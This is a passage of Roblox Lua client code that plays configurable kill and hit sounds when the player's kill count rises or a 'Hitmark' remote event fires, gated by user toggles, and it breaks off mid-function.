local lastKills = 0
local function bindKillDetect()
    local ls = LocalPlayer:WaitForChild("leaderstats", 10)
    if not ls then return end
    local killStat = ls:WaitForChild("Player Kills", 10)
    if not killStat then return end
    lastKills = killStat.Value
    killStat.Changed:Connect(function(val)
        if val > lastKills and Toggles.KillSoundEnabled and Toggles.KillSoundEnabled.Value then
            playSound(Options.KillSoundID and Options.KillSoundID.Value or "130576622673706",
                      tonumber(Options.KillSoundPitch and Options.KillSoundPitch.Value) or 2)
        end
        lastKills = val
    end)
end
task.spawn(bindKillDetect)

task.spawn(function()
    local remoteEvents = ReplicatedStorage:WaitForChild("RemoteEvents", 15)
    if not remoteEvents then return end
    local hitmark = remoteEvents:WaitForChild("Hitmark", 15)
    if not hitmark or not hitmark:IsA("RemoteEvent") then return end
    hitmark.OnClientEvent:Connect(function(incoming)
        if incoming==true then return end
        if Toggles.HitSoundEnabled and Toggles.HitSoundEnabled.Value then
            playSound(Options.HitSoundID and Options.HitSoundID.Value or "78469882347907",
                      tonumber(Options.HitSoundPitch and Options.HitSoundPitch.Value) or 1)
        end
